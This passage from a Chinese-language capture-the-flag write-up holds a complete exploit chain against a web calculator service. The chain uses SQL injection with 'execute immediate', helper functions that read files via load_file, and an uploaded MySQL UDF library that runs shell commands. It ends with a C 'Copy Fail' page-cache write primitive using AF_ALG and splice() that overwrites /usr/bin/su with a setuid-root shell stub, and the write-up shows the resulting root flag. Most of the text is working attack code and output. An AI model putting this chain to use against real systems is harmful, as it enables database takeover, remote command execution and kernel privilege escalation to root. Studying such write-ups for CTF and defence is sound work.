    cmsg->cmsg_type = ALG_SET_OP;
    cmsg->cmsg_len = CMSG_LEN(sizeof(alg_op));
    memcpy(CMSG_DATA(cmsg), &alg_op, sizeof(alg_op));

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_IV;
    cmsg->cmsg_len = CMSG_LEN(sizeof(ivmsg));
    memcpy(CMSG_DATA(cmsg), ivmsg, sizeof(ivmsg));

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    cmsg->cmsg_len = CMSG_LEN(sizeof(assoclen));
    memcpy(CMSG_DATA(cmsg), assoclen, sizeof(assoclen));

    if (sendmsg(op, &msg, MSG_MORE) < 0) {
        perror("sendmsg");
        goto out;
    }

    {
        int fds[2];
        if (pipe(fds) != 0) {
            perror("pipe");
            goto out;
        }
        pr = fds[0];
        pw = fds[1];
    }

    n = splice(fd_target, &src_off, pw, NULL, 32, 0);
    if (n != 32) {
        if (n < 0) {
            perror("splice(file->pipe)");
        } else {
            fprintf(stderr, "splice(file->pipe) short: %zd\n", n);
        }
        goto out;
    }
    n = splice(pr, NULL, op, NULL, 32, 0);
    if (n != 32) {
        if (n < 0) {
            perror("splice(pipe->socket)");
        } else {
            fprintf(stderr, "splice(pipe->socket) short: %zd\n", n);
        }
        goto out;
    }

    n = recv(op, recvbuf, sizeof(recvbuf), 0);
    if (n < 0 && errno != EBADMSG && errno != EINVAL) {
        perror("recv");
        goto out;
    }
    rc = 0;

out:
    if (pr >= 0) {
        close(pr);
    }
    if (pw >= 0) {
        close(pw);
    }
    if (op >= 0) {
        close(op);
    }
    if (master >= 0) {
        close(master);
    }
    if (fd_target >= 0) {
        close(fd_target);
    }
    return rc;
}

int main(int argc, char **argv) {
    unsigned char bytes[4];
    char *end = NULL;
    long long off;
    int i;

    if (argc != 4) {
        fprintf(stderr, "usage: %s <path> <offset> <4-byte-ascii|8-hex-digits>\n", argv[0]);
        return 2;
    }
    off = strtoll(argv[2], &end, 0);
    if (end == NULL || *end != '\0' || off < 0) {
        fprintf(stderr, "invalid offset: %s\n", argv[2]);
        return 2;
    }
    if (strlen(argv[3]) == 4) {
        memcpy(bytes, argv[3], 4);
    } else if (strlen(argv[3]) == 8) {
        for (i = 0; i < 4; i++) {
            char tmp[3];
            tmp[0] = argv[3][i * 2];
            tmp[1] = argv[3][i * 2 + 1];
            tmp[2] = '\0';
            bytes[i] = (unsigned char)strtoul(tmp, &end, 16);
            if (end == NULL || *end != '\0') {
                fprintf(stderr, "invalid hex byte: %s\n", tmp);
                return 2;
            }
        }
    } else {
        fprintf(stderr, "third argument must be 4 ASCII bytes or 8 hex digits\n");
        return 2;
    }
    if (write4(argv[1], (off_t)off, bytes) != 0) {
        return 1;
    }
    return 0;
}
```

它只做一件事：

- 输入 `<目标文件> <偏移> <4字节数据>`
- 借助 `AF_ALG + splice()` 把这 4 字节写到目标文件对应的页缓存里

本地编译：

```Bash
gcc -O2 -static -s -o cfw cf_write4.c
```

之所以静态编译，是为了避免上传到容器后因动态链接问题无法运行。

上传后先拿 `/tmp/t2` 做自测：

原始内容：

```Plain
01234567890123456789...
```

执行：

```Bash
/tmp/cfw /tmp/t2 4 WXYZ
```

再读取回显，得到：

```Plain
0123WXYZ890123456789...
```

这一步说明 `cfw` 的 4 字节页缓存写原语是稳定可用的。

覆写 `/usr/bin/su` 的思路

接下来上传 `cfw` 到容器：

```Plain
/tmp/cfw
```

然后准备一个 160 字节的最小 ELF stub。这个 stub 的逻辑非常简单：

1. `setuid(0)`
2. `execve("/bin/sh", ...)`
3. 退出

后面通过循环，每次覆写 4 字节：

```Python
for off in range(0, len(stub), 4):
    cmds.append(f"/tmp/cfw /usr/bin/su {off} {stub[off:off+4].hex()}")
```

这样把 `/usr/bin/su` 的前 160 字节页缓存全部替换掉。

然后直接执行：

```Bash
printf 'id\ncat /flag\n' | /usr/bin/su
```

由于此时页缓存里的 `/usr/bin/su` 已经不是原程序，而是我们写进去的最小 root shell stub，所以输出就是：

```Plain
uid=0(root) gid=101(mysql) groups=101(mysql)
ACTF{y0u1_sqI_Y0ur_Go!!!!!_dxqmcFIr4ZCpo5OeNqSL}
```

exp

- `libmse9.so`
- `cfw`

```Python
import html
import pathlib
import re
import requests
import shlex

BASE = "http://web-fbc3e8ca0f.adworld.xctf.org.cn:80"


class Exploit:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.calc = self.base + "/calc"
        self.s = requests.Session()

    def _extract(self, text: str) -> str:
        m = re.search(r'<p class="error">(.*?)</p>', text, re.S)
        if m:
            return "ERR:" + html.unescape(re.sub(r"<.*?>", "", m.group(1))).strip()
        m = re.search(r"<li>(.*?)</li>", text, re.S)
        if not m:
            return "NOMATCH"
        raw = html.unescape(re.sub(r"<.*?>", "", m.group(1))).strip()
        return "ROW:" + raw

    def decode_value(self, row: str) -> str:
        if row.startswith("ERR:") or row == "NOMATCH":
            return row
        raw = row[4:]
        if ": " in raw:
            _, value = raw.split(": ", 1)
        else:
            value = raw
        value = value.strip()
        if value == "<nil>":
            return ""
        if value.startswith("[") and value.endswith("]"):
            body = value[1:-1].strip()
            return bytes(int(x) for x in body.split()).decode("utf-8", "replace") if body else ""
        return value

    def expr(self, expression: str, timeout: int = 60) -> str:
        r = self.s.post(self.calc, data={"expression": expression}, timeout=timeout)
        return self._extract(r.text)

    def exec_sql(self, sql: str, timeout: int = 60) -> str:
        return self.expr("1;execute immediate 0x" + sql.encode().hex(), timeout=timeout)

    def read_file(self, path: str) -> str:
        return self.decode_value(self.expr(f"rf('{path}')"))

    def ensure_helpers(self) -> None:
        stmts = [
            "drop function if exists rf",
            "create function rf(p text) returns longtext deterministic return load_file(p)",
            "drop function if exists lenf",
            "create function lenf(p text) returns integer deterministic return length(load_file(p))",
            "drop function if exists hx",
            "create function hx(p text,o integer,l integer) returns longtext deterministic return hex(substr(load_file(p),o,l))",
        ]
        for stmt in stmts:
            self.exec_sql(stmt)

    def upload_blob(self, local_path: str, remote_path: str, timeout: int = 240) -> None:
        blob = pathlib.Path(local_path).read_bytes().hex()
        self.exec_sql(f"select 0x{blob} into dumpfile '{remote_path}'", timeout=timeout)

    def run_cmd(self, cmd: str, out: str = "/tmp/o", timeout: int = 240) -> str:
        payload = f"{{ {cmd}; }} >{out} 2>&1; chmod 644 {out}"
        wrapped = "sh -c " + shlex.quote(payload)
        self.expr("sysx(0x" + wrapped.encode().hex() + ")", timeout=timeout)
        return self.read_file(out)


x = Exploit(BASE)
x.ensure_helpers()

# upload UDF and register sysx
x.upload_blob("libmse9.so", "/usr/lib/mysql/plugin/libmse9.so")
x.exec_sql("drop function if exists sysx")
x.exec_sql("create function sysx returns integer soname 'libmse9.so'")

# upload Copy Fail 4-byte writer
x.upload_blob("cfw", "/tmp/cfw")

# minimal ELF stub: setuid(0) + execve('/bin/sh')
stub = bytes.fromhex(
    "7f454c4602010100000000000000000002003e00010000007800400000000000"
    "4000000000000000000000000000000000000000400038000100000000000000"
    "01000000050000000000000000000000000040000000000000004000000000009e"
    "000000000000009e00000000000000001000000000000031c031ffb0690f05488d"
    "3d0f00000031f66a3b58990f0531ff6a3c580f052f62696e2f7368000000"
)

cmds = ["chmod 755 /tmp/cfw"]
for off in range(0, len(stub), 4):
    cmds.append(f"/tmp/cfw /usr/bin/su {off} {stub[off:off+4].hex()}")
cmds.append("printf 'id\\ncat /flag\\n' | /usr/bin/su")

print(x.run_cmd("; ".join(cmds), out="/tmp/final"))
```